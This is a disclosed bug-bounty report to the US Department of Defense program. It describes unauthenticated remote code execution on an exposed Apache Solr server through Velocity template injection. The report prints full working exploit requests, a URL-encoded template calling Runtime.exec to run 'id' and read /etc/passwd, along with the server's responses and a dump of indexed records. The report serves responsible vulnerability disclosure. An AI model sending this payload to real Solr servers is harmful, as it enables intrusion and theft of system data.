# Apache solr RCE via velocity template

## Report Details
- **Report ID**: 822002
- **URL**: https://hackerone.com/reports/822002
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-03-17T03:28:15.042Z
- **Disclosed**: 2021-01-12T21:49:37.443Z

## Reporter
- **Username**: khizer47
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi team, 

While doing some recon i stumbled upon an IP address http://██████/ The IP took me to a Login Page at ████=https%3A%2F%2F██████████████████

as of the URL suggest this system belongs to US gov. 

Doing a Port scan reveals that POST ██████████ is Open, A lot of doors open if Solr is exposed outside of a trusted network and without administrative authentication.  and the solar instance was without any authentication http://████:████████/ 

Running a Query http://████████:█████████*:*  Showed data from http://██████.mil/ that's why i decided to report it here 

#Query output example: 

````

{
  "responseHeader":{
    "status":0,
    "QTime":0,
    "params":{
      "q":"*:*",
      "_":"1584415352129"}},
  "response":{"numFound":858,"start":0,"docs":[
      {
        "id":"http://███████.mil/instance/relations/locationRelLink#UNIT_TIE_███████",
        "type":["http://███.mil/ont/relations#LocationRelLink"],
        "base.has_link_from_geohash_12_ss":["█████████"],
        "base.has_link_to_geohash_12_ss":["█████████"],
        "base.has_metadata|has_metadata_MIDB-gmi_constraint.has_ownr_producer|US-@id_nidx_ss":["http://███.mil/ont/gmiConstraint/OwnrProducer#US"],
        "base.has_metadata|has_metadata_MIDB-base.is_metadata_of-@id_nidx_ss":["http://█████.mil/instance/relations/locationRelLink#UNIT_TIE_█████"],
        "base.link_predicate|located_at-@id_nidx_ss":["http://██████████.mil/ont/relations#located_at"],
        "base.has_metadata|has_metadata_MIDB-@type_nidx_ss":["http://█████████.mil/ont/base#Metadata"],
        "base.has_metadata|has_metadata_MIDB-dc.source_nidx_ss":["MIDB"],
        "base.link_to-@id_nidx_ss":["http://█████████.mil/instance/base/facility#FAC_███"],
        "base.has_metadata|has_metadata_MIDB-@id_nidx_ss":["http://███████.mil/instance/relations/locationRelLink#UNIT_TIE_██████_has_metadata_MIDB"],
        "base.link_from-@id_nidx_ss":["http://█████.mil/instance/organization/unit#UNIT_████"],
        "_version_":1660996099434872832},
      {
        "id":"http://█████████.mil/instance/base/equipment#██████████",
        "type":["http://██████████.mil/ont/base#Equipment"],
        "gmi_constraint.has_oper_status_ss":["OPR"],
        "equipment.has_nomen|has_nomen_Switch-@type_nidx_ss":["http://████.mil/ont/base#DataQuality"],
        "base.has_location|has_location-base.has_location_name_nidx_ss":["CISCO 3750"],
        "base.has_geo_data|has_geo_data-base.has_geo_metadata|has_geo_metadata_MIDB-base.is_metadata_of-@id_nidx_ss":["http://█████████.mil/instance/base/equipment#████████_has_geo_data"],
        "base.has_geo_data|has_geo_data-base.has_metadata|has_metadata_MIDB-@id_nidx_ss":["http://█████████.mil/instance/base/equipment#████_has_geo_data_has_metadata_MIDB"],
        "base.has_metadata|has_metadata_MIDB-dc.source_nidx_ss":["MIDB"],
        "base.has_country_code|has_country_code_US-base.has_quality_value_nidx_ss":["US"],
        "gmi_constraint.has_condition|has_condition_RDY-@id_nidx_ss":["http://█████.mil/instance/base/equipment#██████████_has_condition_RDY"],
        "base.has_geo_data|has_geo_data-@type_nidx_ss":["http://██████████.mil/ont/base#GeoDataQuality"],
        "base.has_country_code_ss":["US"],
        "gmi_constraint.has_condition|has_condition_RDY-base.has_quality_value_nidx_ss":["RDY"],
        "base.has_geo_data|has_geo_data-base.has_geo_metadata|has_geo_metadata_MIDB-@type_nidx_ss":["http://████████.mil/ont/base#GeoMetadata"],
        "equipment.has_nomen|has_nomen_Switch-base.has_metadata|has_metadata_MIDB-dc.source_nidx_ss":["MIDB"],
        "gmi_constraint.has_condition|has_condition_RDY-base.quality_of-@id_nidx_ss":["http://████████.mil/instance/base/equipment#██████████"],
        "gmi_constraint.has_condition_ss":["RDY"],
        "info.has_graphic|has_graphic-@id_nidx_ss":["http://███.mil/instance/base/equipment#██████████_has_graphic"],
        "gmi_constraint.has_condition|has_condition_RDY-base.has_metadata|has_metadata_MIDB-@type_nidx_ss":["http://█████████.mil/ont/base#Metadata"],
        "gmi_constraint.has_oper_status|has_oper_status_OPR-base.has_metadata|has_metadata_MIDB-@id_nidx_ss":["http://███████.mil/instance/base/equipment#███████_has_oper_status_OPR_has_metadata_MIDB"],
        "gmi_constraint.has_oper_status|has_oper_status_OPR-base.quality_of-@id_nidx_ss":["http://██████.mil/instance/base/equipment#████"],
        "gmi_constraint.has_oper_status|has_oper_status_OPR-base.has_quality_value_enum|OPR-@id_nidx_ss":["http://███.mil/ont/gmiConstraint/OperStatus#OPR"],
        "gmi_constraint.has_oper_status|has_oper_status_OPR-base.has_metadata|has_metadata_MIDB-base.is_metadata_of-@id_nidx_ss":["http://█████████.mil/instance/base/equipment#████_has_oper_status_OPR"],
        "base.has_country_code|has_country_code_US-base.has_metadata|has_met
````

And the Solar Instance is Vulnuberal to RCE via via velocity template 

#Request: 

````
GET ███1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: ██████████:███████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://████████:██████████/solr/
````

#Response:

```
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 51

 0 uid=██████████(solr) gid=████(solr) groups=██████(solr)
```

███

#Request:

```
GET █████1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/etc/passwd%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: ██████:█████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://███████:██████/solr/
```

#Response: 

```
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 952

 0 root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
solr:x:███████:███::/home/solr:
```

█████████


It is recommended to firewall Solr and enable authentication for all requests.

## Impact

Remote Code Execution

## Attachments
No attachments
